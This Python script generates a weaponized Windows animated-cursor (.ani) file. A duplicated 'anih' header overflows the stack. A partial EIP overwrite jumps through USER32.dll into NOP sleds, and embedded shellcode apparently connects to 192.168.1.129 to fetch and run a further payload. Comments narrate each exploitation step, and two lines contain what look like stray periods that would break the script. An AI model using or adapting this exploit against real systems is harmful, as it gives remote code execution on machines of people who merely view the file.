from struct import *
from random import *

def createICON():
	ICON = ""
	ICON +=  pack('<H',0)      #WORD           idReserved
	ICON +=  pack('<H',1)      #WORD           idType
	ICON +=  pack('<H',1)      #WORD           idCount
	ICON += pack('<B',32)      #BYTE        bWidth
	ICON += pack('<B',32)      #BYTE        bHeight
	ICON += pack('<B',16)      #BYTE        bColorCount
	ICON += pack('<B',0)      #BYTE        bReserved
	ICON += pack('<H',0)      #WORD        wPlanes
	ICON += pack('<H',0)      #WORD        wBitCount
	ICON += pack('<I',744)      #DWORD       dwBytesInRes
	ICON += pack('<I',22)      #DWORD       dwImageOffset

	ICON += pack('<I',40)   #DWORD biSize
	ICON += pack('<I',32)   #DWORD biWidth
	ICON += pack('<I',64)   #DWORD biHeight
	ICON += pack('<H',1)    #WORD   biPlanes
	ICON += pack('<H',4)    #WORD   biBitCount
	ICON += pack('<I',0)    #DWORD biCompression
	ICON += pack('<I',0x280) #DWORD biSizeImage
	ICON += pack('<I',0)   #DWORD biXPelsPerMeter
	ICON += pack('<I',0)   #DWORD biYPelsPerMeter
	ICON += pack('<I',0)   #DWORD biClrUsed
	ICON += pack('<I',0)   #DWORD biClrImportant
	for color in xrange(0,16):
		ICON += pack('<B',randint(0,255))    #BYTE    rgbBlue # randint(0,255)
		ICON += pack('<B',randint(0,255))    #BYTE    rgbGreen
		ICON += pack('<B',randint(0,255))    #BYTE    rgbRed
		ICON += pack('<B',0)    #BYTE    rgbReserved
	# XOR mask, scan order, 2 pixels per byte in 16 color mode
	for pos in xrange(0,32*32/2):
		ICON += pack('<B',randint(0,255))    #BYTE               icXOR[32*32/2] 
	for pos in xrange(0,32*32/8):
		ICON += pack('<B',0)    #BYTE               icAND[32*32/8]
	return ICON


def createANI():
	title = ""
	author = ""
	numIcons = 2
	numFrames = 2
	ANI = "RIFF" + pack('<I',0x7ceb) # EIP will jmp here as [EBX] points here. EB7C is a short jmp intruction to the first code island with the NOPs just below.
	# "RIFF" + pack('<I',8+4+4+4+4+4+4+len(title)+4+4+len(author)+4+4+36+2000+4+4+4*numFrames+4+4+4*numFrames+4+4+4+numIcons*(4+4+766))
	ANI += "ACON"
	ANI += "LIST" + pack('<I',5*4+len(title)+len(author))
	ANI += "INFO"
	ANI += "INAM" + pack('<I',len(title))
	ANI += title
	ANI += "IART" + pack('<I',len(author))
	ANI += author
	ANI += "anih" + pack('<I',36)
	ANI += pack('<I',36)        # # bytes in ANIHeader (36 bytes)
	ANI += pack('<I',numIcons)      # # of unique icons in this cursor
	ANI += pack('<I',numFrames)    # # of blits before the animation cycles
	ANI += pack('<I',0)               # reserved, must be zero
	ANI += pack('<I',0)               # reserved, must be zero
	ANI += pack('<I',0)        # reserved, must be zero
	ANI += pack('<I',0)          # reserved, must be zero
	ANI += pack('<I',0)         # (1/60th of a second) if rate chunk not present.
	ANI += pack('<I',0x0001)     # animation flag (see AF_ constants)
	ANI += "anih" + pack('<I',9*4+8*4+3*4+4+2). #Second anih header struct that trigger the over flow. The second part is the size of the header. it has a value so that the BoF will overwrite exactly 2 bytes of EIP, as a way to bypass ASLR
	ANI += pack('<I',0)        # # bytes in ANIHeader (36 bytes)
	ANI += pack('<I',0)      # # of unique icons in this cursor
	ANI += pack('<I',0)    # # of blits before the animation cycles
	ANI += pack('<I',0)               # reserved, must be zero
	ANI += pack('<I',0)               # reserved, must be zero
	ANI += pack('<I',0)        # reserved, must be zero
	ANI += pack('<I',0)          # reserved, must be zero
	ANI += pack('<I',0)         # (1/60th of a second) if rate chunk not present.
	ANI += pack('<I',0)     # animation flag (see AF_ constants). For exploit to work, LSB of this flag should be set to 0. 0 means the resource is a bitmap
	ANI += '\x90'*6*4 # bunch of NOPs
	ANI += '\xeb\x18' # Short jmp to the shell code
	ANI += '\x90'*6   # bunch of NOPs
	ANI += pack('<I',0)*3  #After some debugging and tracing, this represent 3 variables that have to be set to 0, so they dont trigger HeapFree and other errors
	ANI += 'CCCC' # Junk
	ANI += pack('<H',0x90c6). # This is EIP -> jmp [EBX]. Partial overwrite of 2 bytes to bypass ASLR. The original EIP falls in USER32.dll. I found a bunch of JMP [EBX] in it. so this will point to JMP [EBX] in USER32.DLL . [EBX] at this stage points to the beginning of the ANI file in memory. So we will jmp to where RIFF is in memory.
	ANI += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
	ANI += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
	ANI += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
	ANI += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
	ANI += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
	ANI += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
	ANI += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
	ANI += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
	ANI += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
	ANI += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
	ANI += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x6e\x65\x74\x00\x68"
	ANI += "\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31"
	ANI += "\xdb\x53\x53\x53\x53\x53\x68\x3a\x56\x79\xa7\xff\xd5"
	ANI += "\x53\x53\x6a\x03\x53\x53\x68\xa8\x16\x00\x00\xe8\x62"
	ANI += "\x01\x00\x00\x2f\x6e\x53\x35\x46\x4b\x6f\x71\x73\x49"
	ANI += "\x4e\x68\x30\x74\x33\x57\x32\x4b\x44\x4c\x37\x75\x41"
	ANI += "\x50\x70\x79\x66\x5a\x5f\x75\x78\x56\x33\x5f\x67\x43"
	ANI += "\x52\x61\x46\x38\x46\x75\x7a\x65\x39\x5f\x6b\x5a\x4c"
	ANI += "\x4c\x7a\x56\x52\x53\x34\x55\x61\x62\x47\x38\x4e\x65"
	ANI += "\x41\x39\x69\x78\x49\x39\x59\x5a\x72\x63\x5a\x31\x50"
	ANI += "\x4c\x7a\x59\x69\x64\x39\x47\x39\x71\x59\x78\x6f\x49"
	ANI += "\x52\x69\x4c\x71\x55\x38\x64\x78\x6b\x56\x70\x32\x45"
	ANI += "\x74\x31\x6c\x75\x77\x6c\x43\x59\x66\x65\x67\x55\x4e"
	ANI += "\x42\x69\x35\x49\x34\x76\x6b\x77\x30\x6b\x67\x55\x54"
	ANI += "\x79\x6f\x5f\x31\x4a\x77\x39\x6c\x7a\x63\x49\x6f\x41"
	ANI += "\x31\x4e\x62\x53\x6c\x6a\x45\x63\x4a\x75\x72\x73\x63"
	ANI += "\x61\x64\x44\x55\x76\x42\x36\x6e\x7a\x66\x36\x63\x74"
	ANI += "\x30\x63\x32\x5a\x75\x58\x47\x32\x6e\x55\x75\x66\x65"
	ANI += "\x75\x49\x4a\x43\x4e\x70\x6e\x75\x71\x69\x49\x78\x53"
	ANI += "\x6e\x71\x31\x6f\x36\x52\x41\x56\x71\x6d\x6b\x69\x48"
	ANI += "\x62\x73\x4b\x75\x6a\x6a\x52\x4a\x64\x43\x58\x45\x4a"
	ANI += "\x79\x56\x64\x6c\x74\x37\x6f\x74\x70\x35\x6a\x72\x00"
	ANI += "\x50\x68\x57\x89\x9f\xc6\xff\xd5\x89\xc6\x53\x68\x00"
	ANI += "\x02\x60\x84\x53\x53\x53\x57\x53\x56\x68\xeb\x55\x2e"
	ANI += "\x3b\xff\xd5\x96\x6a\x0a\x5f\x53\x53\x53\x53\x56\x68"
	ANI += "\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x14\x68\x88\x13"
	ANI += "\x00\x00\x68\x44\xf0\x35\xe0\xff\xd5\x4f\x75\xe1\xe8"
	ANI += "\x4a\x00\x00\x00\x6a\x40\x68\x00\x10\x00\x00\x68\x00"
	ANI += "\x00\x40\x00\x53\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53"
	ANI += "\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12"
	ANI += "\x96\x89\xe2\xff\xd5\x85\xc0\x74\xcf\x8b\x07\x01\xc3"
	ANI += "\x85\xc0\x75\xe5\x58\xc3\x5f\xe8\x7f\xff\xff\xff\x31"
	ANI += "\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x31\x32\x39\x00"
	ANI += "\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5"
	# ANI += 'AAAA'
	# ANI += "rate" + pack('<I',4*numFrames)
	# ANI += "seq " + pack('<I',4*numFrames)
	# ANI += pack('<I',0)
	# ANI += "LIST" + pack('<I',4+(4+4+766)*numIcons)
	# ANI += "fram"
	# for iconNr in xrange(0,numIcons):
	# 	ANI += "icon" + pack('<I',766)
	# 	ANI += createICON()
	return ANI
#RIFF
#  size
#  ACON
#    LIST
#	   size
#      INFO
#        INAM
#            size
#            title
#            strlen(title)
#        IART
#            size
#            author
#            strlen(author)
#  anih
#      size
#      header
#  rate
#      size
#      rates        
#  seq
#      size
#      seqs
#  LIST
#    size
#    fram
#    icon
#       size
#       iconData
with open('exploit.ani', 'w') as ANIFile:
    ANIFile.write(createANI())